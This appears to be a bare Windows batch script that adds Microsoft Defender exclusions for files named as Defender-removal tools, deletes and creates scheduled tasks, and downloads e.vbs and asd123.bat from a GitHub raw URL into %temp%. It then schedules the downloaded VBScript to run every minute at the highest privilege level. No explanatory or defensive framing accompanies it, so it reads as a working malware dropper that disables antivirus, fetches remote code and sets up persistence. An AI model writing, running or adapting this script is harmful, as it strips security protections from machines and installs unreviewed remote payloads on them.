powershell -Command "Add-MpPreference -ExclusionPath '%temp%\DefenderRemover.bat'"
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\RemoveSecHealthApp.ps1'"
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\PowerRun.exe'"
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\Remove_SecurityComp\Remove_SecurityComp.reg'"
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\Remove_Defender\NomoreDelayandTimeouts.reg'"
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\Remove_Defender\Output.reg'"
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\Remove_Defender\RemoveShellAssociation.reg'"
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\RunDefenderRemover.vbs'"




schtasks /delete /tn "upgradef1" /f
schtasks /delete /tn "InstallRequests" /f
schtasks /delete /tn "RunPowerShellScript" /f
cd %temp%
mkdir Remove_SecurityComp
mkdir Remove_Defender
cd Remove_Defender



cd %temp%
curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/e.vbs-o e.vbs
curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/asd123.bat -o asd123.bat


schtasks /create /tn "TempVBS" /tr "%temp%\e.vbs" /sc minute /mo 1  /f /rl HIGHEST
